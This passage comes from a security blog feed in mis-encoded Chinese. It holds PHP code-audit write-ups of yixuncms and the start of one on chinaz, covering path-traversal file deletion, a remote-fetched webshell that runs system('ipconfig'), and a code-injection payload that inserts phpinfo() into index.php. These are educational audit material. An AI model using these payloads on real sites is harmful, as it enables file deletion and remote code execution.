<p>è¯´åˆ°è¿™é‡Œï¼Œä¸€èˆ¬éƒ½åˆ°äº†ç«‹flagçš„æ—¶é—´ï¼Œæˆ‘ä¹Ÿä¸ä¾‹å¤–ï¼Œæ˜å¤©å°±æ˜¯2020å¹´äº†ï¼Œæ–°çš„ä¸€å¹´åšä¸ªçŸ­æœŸè§„åˆ’ä¹Ÿæ˜¯æŒºä¸é”™çš„ã€‚å¯¹äºWebå®‰å…¨è¿™æ¡è·¯ï¼Œæˆ‘åŠ å…¥ä¹‹å‰è¿™ä¸ªå¹³å°ä¹‹å‰ï¼Œä¹Ÿå¾ˆæƒ³å­¦Webå®‰å…¨ï¼Œä¹Ÿåœ¨å„å¤§è®ºå›çœ‹äº†ä¸å°‘çš„ç»éªŒè´´ï¼Œä½†è¯´åˆ°åº•è¿˜æ˜¯åˆ«äººçš„ç»éªŒï¼Œæˆ‘ä¸çŸ¥é“æˆ‘è¦å­¦ä»€ä¹ˆï¼Œç›®æ ‡æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆæ ·èµ°ä¸‹å»ï¼Œè¿™äº›éƒ½éå¸¸åœ°å›°æƒ‘æˆ‘ã€‚ç°åœ¨ï¼Œæˆ‘ä¼šç»§ç»­è·Ÿç€è‰¯å“¥çš„è®¡åˆ’èµ°ï¼Œåœ¨å¹´åº•ä¹‹å‰å®Œæˆwebå®‰å…¨çš„å‰©ä½™ä»»åŠ¡ï¼ŒåŒæ—¶å¼€å¯æ¸—é€æµ‹è¯•çš„æ–°ç¯‡ç« ï¼Œä»¥æŸä¸ªSRCä¸ºç›®æ ‡ä½“éªŒæ¸—é€çš„è¿‡ç¨‹ã€‚åœ¨æ­¤æœŸé—´ï¼Œæˆ‘ä¹Ÿä¼šåœ¨å‰æœŸè¯•ç€çœ‹ä¸€äº›ç°æœ‰çš„æ•™ç¨‹ç©ä¸€ç©Hack the boxé¶æœºï¼Œæ¯•ç«Ÿåœ¨å½“å‰çš„æ³•å¾‹æ³•è§„é¢å‰ï¼Œæ‰“é¶æœºè¿˜æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚å¦å¤–è¿˜æœ‰æ›´é‡è¦çš„ä¸€æ¡è·¯çº¿å°±æ˜¯æ¼æ´æŒ–æ˜ï¼ˆä¹Ÿæœ‰å¯èƒ½æ˜¯ä»£ç å®¡è®¡ï¼‰+æœºå™¨å­¦ä¹ ï¼Œæ¯•ç«Ÿæ˜¯è¦å‡ºè®ºæ–‡çš„ï¼Œå•ç‹¬ä¸€ä¸ªWebå®‰å…¨å†™ä¸å‡ºä»€ä¹ˆå¤ªå¤šçš„èŠ±æ ·ï¼Œå¸Œæœ›è‡ªå·±èƒ½ç»“åˆå½“å‰æ¯”è¾ƒç«çƒ­çš„MLã€DLç­‰ä½œä¸ºè‡ªå·±æ—¥åçš„ç ”ç©¶æ–¹å‘ï¼Œç›®å‰åœ¨çœ‹å´æ©è¾¾è€å¸ˆçš„æœºå™¨å­¦ä¹ è¯¾ç¨‹ï¼Œå­¦å®Œäº†åŸºç¡€çŸ¥è¯†å†å»ç ”ç©¶å…·ä½“çš„å·¥ä½œã€‚è¦æ˜¯å“ªä½å¤§ä½¬æ­£åœ¨æè¿™ä¸ªï¼Œå¸Œæœ›èƒ½å¸¦å¸¦å°å¼Ÿå…±åŒäº¤æµã€‚</p>
<p>å¥½äº†ï¼Œæ–‡ç« çš„æœ€åï¼Œå°±ç”¨ä¸€å¥è¯ä¸å°ä¼™ä¼´ä»¬å…±å‹‰ï¼šå­¦ä¹ ä¹‹è·¯ï¼Œé“é˜»ä¸”é•¿ï¼Œä¸Šä¸‹æ±‚ç´¢ã€‚</p>
]]></content>
      <categories>
        <category>æ‚è°ˆ</category>
      </categories>
      <tags>
        <tag>ç»éªŒ</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡â€”â€”yixuncms</title>
    <url>/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡â€”â€”yixuncmså®¡è®¡">PHPä»£ç å®¡è®¡â€”â€”yixuncmså®¡è®¡</h1>
<h2 id="0x01-å®¡è®¡å…¥å£">0x01 å®¡è®¡å…¥å£</h2>
<p>å¯¹äºä¸€ä¸ªMVCç»“æ„è€Œè¨€ï¼Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯é¦–å…ˆå¼„æ¸…æ¥šè·¯ç”±æ˜¯æ€ä¹ˆèµ°çš„ï¼Œé¦–å…ˆçœ‹åˆ°<code>index.php</code>ä¸­åŒ…å«äº†<code>home/index.php</code>ï¼Œå…¶ä¸­ç¬¬106è¡Œè°ƒç”¨äº†<code>Prourl::parseUrl();</code>ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥è§£æUrlï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class/prourl.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Prourl</span> </span>&#123;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * URLè·¯ç”±,è½¬ä¸ºPATHINFOçš„æ ¼å¼</span></span><br><span class="line"><span class="comment">		 */</span> </span><br><span class="line">		<span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;PATH_INFO&#x27;</span>]))&#123;</span><br><span class="line">      			 	<span class="comment">//è·å– pathinfo</span></span><br><span class="line">				$pathinfo = explode(<span class="string">&#x27;/&#x27;</span>, trim($_SERVER[<span class="string">&#x27;PATH_INFO&#x27;</span>], <span class="string">&quot;/&quot;</span>));</span><br><span class="line">			</span><br><span class="line">       				<span class="comment">// è·å– control</span></span><br><span class="line">       				$_GET[<span class="string">&#x27;m&#x27;</span>] = (!<span class="keyword">empty</span>($pathinfo[<span class="number">0</span>]) ? $pathinfo[<span class="number">0</span>] : <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"></span><br><span class="line">       				array_shift($pathinfo); <span class="comment">//å°†æ•°ç»„å¼€å¤´çš„å•å…ƒç§»å‡ºæ•°ç»„ </span></span><br><span class="line">      				</span><br><span class="line">			       	<span class="comment">// è·å– action</span></span><br><span class="line">       				$_GET[<span class="string">&#x27;a&#x27;</span>] = (!<span class="keyword">empty</span>($pathinfo[<span class="number">0</span>]) ? $pathinfo[<span class="number">0</span>] : <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">				array_shift($pathinfo); <span class="comment">//å†å°†å°†æ•°ç»„å¼€å¤´çš„å•å…ƒç§»å‡ºæ•°ç»„ </span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($pathinfo); $i+=<span class="number">2</span>)&#123;</span><br><span class="line">					$_GET[$pathinfo[$i]]=$pathinfo[$i+<span class="number">1</span>];</span><br><span class="line">				&#125;</span><br><span class="line">			</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;	</span><br><span class="line">				$_GET[<span class="string">&quot;m&quot;</span>]= (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;m&#x27;</span>]) ? $_GET[<span class="string">&#x27;m&#x27;</span>]: <span class="string">&#x27;index&#x27;</span>);    <span class="comment">//é»˜è®¤æ˜¯indexæ¨¡å—</span></span><br><span class="line">				$_GET[<span class="string">&quot;a&quot;</span>]= (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>);   <span class="comment">//é»˜è®¤æ˜¯indexåŠ¨ä½œ</span></span><br><span class="line">	</span><br><span class="line">				<span class="keyword">if</span>($_SERVER[<span class="string">&quot;QUERY_STRING&quot;</span>])&#123;</span><br><span class="line">					$m=$_GET[<span class="string">&quot;m&quot;</span>];</span><br><span class="line">					<span class="keyword">unset</span>($_GET[<span class="string">&quot;m&quot;</span>]);  <span class="comment">//å»é™¤æ•°ç»„ä¸­çš„m</span></span><br><span class="line">					$a=$_GET[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">					<span class="keyword">unset</span>($_GET[<span class="string">&quot;a&quot;</span>]);  <span class="comment">//å»é™¤æ•°ç»„ä¸­çš„a</span></span><br><span class="line">					$query=http_build_query($_GET);   <span class="comment">//å½¢æˆ0=foo&amp;1=bar&amp;2=baz&amp;3=boom&amp;cow=milkæ ¼å¼</span></span><br><span class="line">					<span class="comment">//ç»„æˆæ–°çš„URL</span></span><br><span class="line">					$url=$_SERVER[<span class="string">&quot;SCRIPT_NAME&quot;</span>].<span class="string">&quot;/<span class="subst">&#123;$m&#125;</span>/<span class="subst">&#123;$a&#125;</span>/&quot;</span>.str_replace(<span class="keyword">array</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;=&quot;</span>), <span class="string">&quot;/&quot;</span>, $query);</span><br><span class="line">					header(<span class="string">&quot;Location:&quot;</span>.$url);</span><br><span class="line">				&#125;	</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>â€˜PATH_INFOâ€™</p>
<p>åŒ…å«ç”±å®¢æˆ·ç«¯æä¾›çš„ã€è·Ÿåœ¨çœŸå®è„šæœ¬åç§°ä¹‹åå¹¶ä¸”åœ¨æŸ¥è¯¢è¯­å¥ï¼ˆquery stringï¼‰ä¹‹å‰çš„è·¯å¾„ä¿¡æ¯ï¼Œå¦‚æœå­˜åœ¨çš„è¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå½“å‰è„šæœ¬æ˜¯é€šè¿‡ URL <a href="http://www.example.com/php/path_info.php/some/stuff?foo=bar">http://www.example.com/php/path_info.php/some/stuff?foo=bar</a> è¢«è®¿é—®ï¼Œé‚£ä¹ˆ $_SERVER[â€˜PATH_INFOâ€™] å°†åŒ…å« <em>/some/stuff</em>ã€‚</p>
</blockquote>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚è®¿é—®<code>http://127.0.0.1/index.php/index/hello/pid/1</code>ï¼Œé‚£ä¹ˆ<code>parseUrl()</code>å‡½æ•°ä¼šå°†<code>index</code>è§£ææˆç±»åï¼Œ<code>hello</code>è§£ææˆæ–¹æ³•åï¼Œ<code>pid</code>æ˜¯å‚æ•°åï¼Œ<code>1</code>æ˜¯å‚æ•°å€¼ã€‚å¦‚æœæ˜¯é€šè¿‡GETä¼ å‚çš„å½¢å¼ä¼ å…¥çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå…ˆå°†Urlè½¬æ¢æˆä¸Šé¢è¿™ç§è¡¨ç¤ºå½¢å¼ï¼Œå†æŒ‰ç›¸åŒçš„æµç¨‹å¤„ç†ã€‚</p>
<p>å¦å¤–ï¼Œé¡¹ç›®ä¸­çš„<code>runtime</code>æ˜¯å¯¹ç½‘ç«™çš„ç¼“å­˜æ–‡ä»¶ï¼Œä¹Ÿå°±è¯´å‡å¦‚ä½ è®¿é—®äº†adminåå°ç½‘ç«™ï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡å†è®¿é—®çš„æ—¶å€™å°±ä¼šåœ¨<code>runtime</code>ç›®å½•ä¸‹æ‰§è¡Œï¼Œè€Œä¸æ˜¯è¿›å…¥<code>admin</code>ç›®å½•ã€‚</p>
<h2 id="0x02-å®¡è®¡è¿‡ç¨‹">0x02 å®¡è®¡è¿‡ç¨‹</h2>
<p>é¦–å…ˆç”¨Seayå’ŒRipså·¥å…·æ‰«æä¸€éï¼Œæœ‰ä¸€ä¸ªå¤§æ¦‚çš„æ–¹å‘ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608115550.png" alt=""></p>
<h3 id="controls-flink-class-phpä»»æ„æ–‡ä»¶åˆ é™¤"><code>controls/flink.class.php</code>ä»»æ„æ–‡ä»¶åˆ é™¤</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> 	$flink = D(<span class="string">&#x27;flink&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;logoc&#x27;</span>]))&#123;</span><br><span class="line">		$logo = $flink-&gt;downlogo($_POST[<span class="string">&#x27;logoc&#x27;</span>]);</span><br><span class="line">		$srclogo = PROJECT_PATH.<span class="string">&quot;public/uploads/logos/&quot;</span>.$_POST[<span class="string">&quot;logo&quot;</span>];</span><br><span class="line">		<span class="keyword">if</span>(file_exists($srclogo))</span><br><span class="line">			unlink($srclogo);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$logo = $_POST[<span class="string">&quot;logo&quot;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($logo)&#123;</span><br><span class="line">		$_POST[<span class="string">&quot;logo&quot;</span>] = $logo;</span><br><span class="line">		<span class="keyword">if</span>($flink-&gt;update($_POST,<span class="number">1</span>,<span class="number">1</span>))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;redirect(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$mess = $flink-&gt;getMsg();</span><br><span class="line">			<span class="keyword">if</span>($mess == <span class="string">&quot;&quot;</span>)</span><br><span class="line">				$mess = <span class="string">&quot;æ‚¨æœªåšä»»ä½•ä¿®æ”¹&quot;</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;mess($mess,<span class="literal">false</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;post&quot;</span>,$_POST);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;mess(<span class="string">&quot;LOGOä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥URLåœ°å€æ˜¯å¦æ­£ç¡®&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;post&quot;</span>,$_POST);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;display(<span class="string">&quot;mod&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¼æ´å‡ºåœ¨ç¬¬55è¡Œçš„<code>unlink()</code>å‡½æ•°ï¼Œå‚æ•°<code>$srclogo</code>æ˜¯ç”±ç”¨æˆ·POSTå‚æ•°<code>logo</code>å†æ‹¼æ¥ç½‘ç«™ç›®å½•å¾—åˆ°çš„ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±å¾ˆå®¹æ˜“åˆ©ç”¨è·¯å¾„éå†æ¥åˆ é™¤ä»»ä½•æ–‡ä»¶ã€‚åˆ©ç”¨æ–¹å¼ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608142703.png" alt=""></p>
<h3 id="models-flink-php-classæ–‡ä»¶å†™å…¥"><code>models/flink.php.class</code>æ–‡ä»¶å†™å…¥</h3>
<p>é¦–å…ˆé€šè¿‡ä¸€ä¸ªå±é™©å‡½æ•°<code>file_put_contens()</code>å®šä½åˆ°<code>models/flink.class.php</code>æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Flink</span></span>&#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">downlogo</span>(<span class="params">$logourl</span>)</span>&#123;</span><br><span class="line">			$url = parse_url($logourl);</span><br><span class="line">			$logoname = str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;_&quot;</span>,$url[<span class="string">&#x27;host&#x27;</span>]).<span class="string">&quot;.&quot;</span>.array_pop(explode(<span class="string">&quot;.&quot;</span>,basename($logourl)));</span><br><span class="line">			$path = PROJECT_PATH.<span class="string">&quot;public/uploads/logos/&quot;</span>;</span><br><span class="line">			<span class="keyword">if</span>(!file_exists($path))&#123;</span><br><span class="line">				mkdir($path);</span><br><span class="line">			&#125;</span><br><span class="line">			$location = $path.$logoname;</span><br><span class="line">			$data = file_get_contents($logourl);</span><br><span class="line">			<span class="keyword">if</span>(strlen($data) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">				file_put_contents($location,$data);</span><br><span class="line">				<span class="keyword">return</span> $logoname;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>file_put_contents()</code>æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼š<code>$location</code>å’Œ<code>$data</code>ã€‚<code>$location</code>å‚æ•°æ˜¯é€šè¿‡æ‹¼æ¥<code>.public/uploads/logos</code>å’Œ<code>$logoname</code>ï¼Œè€Œ<code>logoname</code>é¦–å…ˆé€šè¿‡<code>parse_url</code>æŠŠ<code>$logourl</code>è§£ææˆæ•°ç»„å½¢å¼ï¼Œç„¶åå†æŠŠ<code>host</code>å­—æ®µçš„å€¼ä¸­çš„<code>.</code>æ›¿æ¢æˆ<code>_</code>ï¼Œåç¼€åæ˜¯æ–‡ä»¶çš„åç¼€åï¼Œä¸¾ä¸ªä¾‹å­ï¼šåŠ å…¥<code>$url=http://127.0.0.1/shell.php</code>ï¼Œé‚£ä¹ˆ<code>$logoname=127_0_0_1.php</code>ã€‚å¦å¤–ï¼Œ<code>$data</code>å‚æ•°æ˜¯é€šè¿‡<code>file_get_contents()</code>å‡½æ•°è¯»å–Urlä¸­çš„æ–‡ä»¶å†…å®¹ã€‚</p>
<p>å…¨å±€æœç´¢<code>downlogo</code>å…³é”®å­—ï¼Œå‘ç°<code>controls/flink.class.php</code>æ–‡ä»¶ä¸­çš„<code>insert()</code>å‡½æ•°è°ƒç”¨äº†<code>downlogo()</code>å‡½æ•°ï¼Œé€šè¿‡POSTçš„æ–¹å¼ä¼ å‚ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<ol>
<li>
<p>ç¬¬ä¸€æ­¥é¦–å…ˆåœ¨è‡ªå·±çš„VPSä¸­å†™ä¸€ä¸ª<code>shell.php</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    system(&#x27;ipconfig&#x27;);</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæºä»£ç ä¸­æ˜¯é€šè¿‡<code>file_get_contents()</code>å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æŠŠçœŸæ­£çš„shellæ–‡ä»¶å†…å®¹<code>echo</code>åˆ°é¡µé¢ä¸Šã€‚</p>
</li>
<li>
<p>å‘èµ·è¯·æ±‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608145558.png" alt=""></p>
</li>
<li>
<p>è®¿é—®<code>http://localhost/public/uploads/logos/xx_xx_xx_xx.php</code></p>
</li>
</ol>
<h3 id="classes-baseset-class-phpä»»æ„ä»£ç æ‰§è¡Œ"><code>classes/baseset.class.php</code>ä»»æ„ä»£ç æ‰§è¡Œ</h3>
<p>ä»ç„¶æ˜¯å…¨å±€æœç´¢<code>file_put_contents</code>å…³é”®å­—ï¼Œåœ¨<code>classes/baseset.class.php</code>æ–‡ä»¶ä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">writeindex</span>(<span class="params">$style,$start</span>)</span>&#123;</span><br><span class="line">	$file=PROJECT_PATH.<span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">	$content=file_get_contents($file);</span><br><span class="line">	$reg[]=<span class="string">&quot;/define\(\&quot;TPLSTYLE\&quot;.+?;/i&quot;</span>;</span><br><span class="line">	$reg[]=<span class="string">&quot;/define\(\&quot;CSTART\&quot;.+?;/i&quot;</span>;</span><br><span class="line">	$rep[]=<span class="string">&quot;define(\&quot;TPLSTYLE\&quot;,\&quot;<span class="subst">&#123;$style&#125;</span>\&quot;);&quot;</span>;</span><br><span class="line">	$rep[]=<span class="string">&quot;define(\&quot;CSTART\&quot;,\&quot;<span class="subst">&#123;$start&#125;</span>\&quot;);&quot;</span>;</span><br><span class="line">	file_put_contents($file, preg_replace($reg, $rep, $content));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç®€å•æ¥è®²ï¼Œ<code>writeindex()</code>å‡½æ•°å°±æ˜¯å°†<code>index.php</code>ä¸­çš„ä¸¤ä¸ªå¸¸é‡<code>TPLSTYLE</code>å’Œ<code>CSTART</code>çš„å€¼åˆ†åˆ«æ›¿æ¢æˆ<code>$style</code>å’Œ<code>$start</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	define(<span class="string">&quot;CSTART&quot;</span>,<span class="string">&quot;0&quot;</span>);               <span class="comment">//æ˜¯å¦å¼€å¯ç¼“å­˜ 1å¼€å¯ 0å…³é—­</span></span><br><span class="line">	define(<span class="string">&quot;TPLSTYLE&quot;</span>,<span class="string">&quot;default&quot;</span>);          <span class="comment">//é»˜è®¤æ¨¡æ¿å­˜æ”¾çš„ç›®å½•</span></span><br><span class="line">	define(<span class="string">&quot;APP&quot;</span>, <span class="string">&quot;./home&quot;</span>);</span><br><span class="line">	<span class="keyword">require</span> <span class="string">&quot;./php/index.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœ<code>$start=0&quot;); &lt;?php phpinfo(); ?&gt; &lt;?php //</code> ï¼Œé‚£ä¹ˆå°±å˜æˆäº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	define(<span class="string">&quot;CSTART&quot;</span>,<span class="string">&quot;0&quot;</span>); <span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span> <span class="meta">&lt;?php</span> <span class="comment">//&quot;);</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±é€ æˆäº†ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹å“ªäº›åœ°æ–¹è°ƒç”¨äº†<code>writeindex()</code>å‡½æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608151152.png" alt=""></p>
<p>å†å…¨å±€æœç´¢<code>writeindex()</code>å‡½æ•°ï¼š</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200608151404395.png" alt="image-20200608151404395"></p>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608152410.png" alt=""></p>
<h2 id="0x03-å¸¸è§å‡½æ•°">0x03 å¸¸è§å‡½æ•°</h2>
<h3 id="ä»£ç æ‰§è¡Œå‡½æ•°">ä»£ç æ‰§è¡Œå‡½æ•°</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608152538.png" alt=""></p>
<h3 id="æ–‡ä»¶ç›¸å…³å‡½æ•°">æ–‡ä»¶ç›¸å…³å‡½æ•°</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200608152632.png" alt=""></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡â€”â€”chinaz</title>
    <url>/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”chinaz">PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”chinaz</h1>
<h2 id="0x01-å®¡è®¡å…¥å£">0x01 å®¡è®¡å…¥å£</h2>
<p>é¦–å…ˆchinazæ²¡æœ‰åå°æ•°æ®åº“ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªå•å…¥å£ç±»ï¼Œä¸åŒäºä¸Šä¸€ç¯‡Yixuncmsæ˜¯ä¸€ä¸ªMVCçš„æ¶æ„æ¨¡å¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/view.php&quot;</span>);</span><br><span class="line">$view_class = <span class="keyword">new</span> View();</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$data[<span class="string">&#x27;page&#x27;</span>] = filter($_GET[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$data[<span class="string">&#x27;page&#x27;</span>] = <span class="string">&#x27;js&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$view_class-&gt;echoContent($data[<span class="string">&#x27;page&#x27;</span>], $data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨index.phpæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°é¦–å…ˆåŒ…å«äº†å…¬å…±æ–‡ä»¶å’Œæ¸²æŸ“æ–‡ä»¶è¿›æ¥ï¼Œç„¶ånewäº†ä¸€ä¸ªViewç±»çš„å¯¹è±¡ã€‚</p>
<p>æ¥ç€æ£€æµ‹æ˜¯å¦ä»¥getæ–¹å¼ä¼ å…¥pageå˜é‡ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨filteræ–¹æ³•è¿‡æ»¤å˜é‡ä¸­çš„æ•°æ®ï¼Œæœ€åå†è°ƒç”¨<code>echoContent</code>æ–¹æ³•åŠ è½½é¡µé¢ã€‚</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606170628.png" style="zoom:50%;" />
<p>é‚£ä¹ˆç½‘ç«™çš„ç›®å½•ç»“æ„ä¹Ÿå°±å¤§æ¦‚æ¸…æ¥šäº†ï¼Œ<code>library</code>ä¸­åŒ…å«å…¬å…±æ–‡ä»¶å’Œæ¸²æŸ“æ–‡ä»¶ï¼Œ<code>logs</code>ä¸­è®°å½•æ—¥å¿—ï¼Œ<code>static</code>æ˜¯ä¸€äº›é™æ€èµ„æºæ–‡ä»¶ï¼Œ<code>views</code></p>
<p>ç±»ä¼¼è§†å›¾æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­åŒ…å«äº†HTMLä»£ç ï¼Œå„ä¸ªæ¨¡å—é€šè¿‡<code>action.php</code>POSTå‚æ•°è·³è½¬åˆ°ç›¸åº”åŠŸèƒ½æ¨¡å—çš„PHPæ–‡ä»¶ã€‚</p>
<h2 id="0x02-å·¥å…·æ‰«æ">0x02 å·¥å…·æ‰«æ</h2>
<p>é¦–å…ˆä¸Šå·¥å…·ï¼Œç”¨Seayå’Œripsæ‰«ä¸€éï¼š</p>
<p>ripsç»“æœï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606170001.png" alt=""></p>
<p>Seayç»“æœï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606170025.png" alt=""></p>
<p>è¿™ä¸¤ä¸ªå·¥å…·éƒ½æåˆ°äº†<code>action.php</code>ä¸­çš„<code>require_once()</code>å‡½æ•°ï¼Œé‚£å°±ä»è¿™ä¸ªåœ°æ–¹å‡ºå‘ã€‚</p>
<h2 id="0x03-å®¡è®¡è¿‡ç¨‹">0x03 å®¡è®¡è¿‡ç¨‹</h2>
<h3 id="action-phpæ–‡ä»¶åŒ…å«"><code>action.php</code>æ–‡ä»¶åŒ…å«</h3>
